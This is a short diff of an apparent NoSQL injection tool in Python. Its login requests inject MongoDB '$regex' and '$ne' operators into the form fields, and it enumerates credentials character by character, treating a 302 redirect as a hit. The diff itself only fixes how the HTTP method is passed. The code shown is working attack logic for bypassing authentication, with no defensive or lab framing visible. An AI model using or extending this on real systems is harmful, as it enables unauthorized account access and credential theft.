@@ -61,7 +61,7 @@ def main():
         para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
         try:
-            r = session.request(method, url, data=para, allow_redirects=False, timeout=10)  # Increased timeout to 10 seconds
+            r = session.request(method.upper(), url, data=para, allow_redirects=False, timeout=10)  # Fixed the method argument
             r.raise_for_status()
 
             if r.status_code == 302:
@@ -75,7 +75,7 @@ def main():
                         para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
                         try:
-                            r = session.request(method, url, data=para, timeout=10)  # Increased timeout to 10 seconds
+                            r = session.request(method.upper(), url, data=para, timeout=10)  # Fixed the method argument
                             r.raise_for_status()
 
                             if r.status_code == 302:
